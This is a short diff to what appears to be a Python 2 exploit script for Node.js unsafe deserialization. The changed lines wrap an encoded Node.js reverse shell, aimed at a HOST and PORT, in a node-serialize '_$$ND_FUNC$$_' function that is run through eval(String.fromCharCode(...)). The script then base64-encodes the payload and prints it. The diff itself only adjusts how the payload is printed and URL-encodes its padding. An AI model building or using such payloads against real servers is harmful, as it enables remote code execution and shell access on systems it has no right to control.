@@ -54,5 +54,7 @@ c(HOST,PORT);
 print "[+] Encoded"
 PAYLOAD = charencode(NODEJS_REV_SHELL)
 PAYLOAD_Final = "{\"rce\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))" % (PAYLOAD) + "}()\"}"
+print PAYLOAD_Final + "=="
 PAYLOAD_Encoded = base64.b64encode(PAYLOAD_Final)
-print PAYLOAD_Encoded + "=="
+print "[+] B64 Encoded"
+print PAYLOAD_Encoded + "%3D%3D"
